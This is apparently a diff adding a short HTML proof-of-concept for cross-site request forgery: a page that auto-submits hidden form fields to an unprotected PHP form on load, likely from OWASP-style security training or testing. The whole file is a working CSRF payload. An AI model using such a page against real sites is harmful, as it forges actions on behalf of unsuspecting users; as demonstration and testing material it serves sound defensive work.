@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<body onload="load()">
+    <form action="form_unprotected.php"
+          method="post" id="csrf_test" name="csrf_test">
+              <input name="name" type="hidden" value="No Goodnick" />
+              <input name="email" type="hidden" value="malicious@owasp.org" />
+              <input name="comments" type="hidden"
+                     value="Form is vulnarable to CSRF attacks!" />
+              <input name="process" type="hidden" value="1" />
+    </form>
+    <script>
+        function load() { document.forms['csrf_test'].submit();}
+    </script>
+</body>
